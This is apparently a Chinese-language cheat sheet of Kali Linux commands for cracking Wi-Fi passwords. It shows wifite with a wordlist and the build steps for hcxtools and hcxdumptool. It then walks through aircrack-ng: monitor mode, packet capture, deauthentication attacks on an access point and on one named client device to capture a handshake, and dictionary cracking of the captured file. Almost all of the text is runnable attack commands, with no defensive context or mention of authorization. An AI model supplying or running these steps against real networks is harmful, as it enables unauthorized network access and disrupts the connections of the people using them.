  #### wifite
	Kali下工具wifite，加载网卡，开启监听模式，#airmon-ng check kill
	>airmon-ng start wlan1
	安装hcxtools v4.2.0或更高版本，hcxdumptool v4.2.0或更高版本
	>apt-get install libcurl4-openssl-dev libssl-dev zlib1g-dev libpcap-dev
	>git clone https://github.com/ZerBea/hcxtools
	>cd hcxtools
	>make
	>make install 
	>git clone https://github.com/ZerBea/hcxdumptool
	>cd hcxdumptool
	>make
	>make install
	>wifite –-dict /root/Desktop/wordlist.txt  加载
  #### Aircrack-ng
	>airmon-ng start wlan0 开启监听模式
	>airodump-ng wlan0mon  查看数据包
	>airodump-ng –c 1 –bssid APmac –w name wlan1mon保存某AP数据包
	>aireplay-ng –deauth 10 –a APmac wlan0mon  deauth攻击
	>aireplay-ng -0 2 -a C8:3A:35:30:3E:C8 -c B8:E8:56:09:CC:9C wlan0mon deauth攻击某个设备直至获取handshake(握手包)
	>airmon-ng stop wlan0mon  关闭监听模式
	>aircrack-ng –w wordlist.txt name.cap 指定字典破解密码